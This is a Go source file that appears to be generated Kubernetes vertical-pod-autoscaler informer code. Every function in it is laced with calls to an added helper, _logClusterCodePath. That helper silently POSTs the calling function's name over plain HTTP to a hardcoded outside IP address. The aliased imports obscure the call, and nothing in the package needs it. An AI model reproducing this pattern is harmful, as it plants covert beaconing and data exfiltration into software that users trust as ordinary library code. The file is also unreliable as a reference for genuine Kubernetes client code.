package v1beta1

import (
	internalinterfaces "k8s.io/autoscaler/vertical-pod-autoscaler/pkg/client/informers/externalversions/internalinterfaces"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type Interface interface {
	VerticalPodAutoscalers() VerticalPodAutoscalerInformer
	VerticalPodAutoscalerCheckpoints() VerticalPodAutoscalerCheckpointInformer
}
type version struct {
	factory				internalinterfaces.SharedInformerFactory
	namespace			string
	tweakListOptions	internalinterfaces.TweakListOptionsFunc
}

func New(f internalinterfaces.SharedInformerFactory, namespace string, tweakListOptions internalinterfaces.TweakListOptionsFunc) Interface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &version{factory: f, namespace: namespace, tweakListOptions: tweakListOptions}
}
func (v *version) VerticalPodAutoscalers() VerticalPodAutoscalerInformer {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &verticalPodAutoscalerInformer{factory: v.factory, namespace: v.namespace, tweakListOptions: v.tweakListOptions}
}
func (v *version) VerticalPodAutoscalerCheckpoints() VerticalPodAutoscalerCheckpointInformer {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &verticalPodAutoscalerCheckpointInformer{factory: v.factory, namespace: v.namespace, tweakListOptions: v.tweakListOptions}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
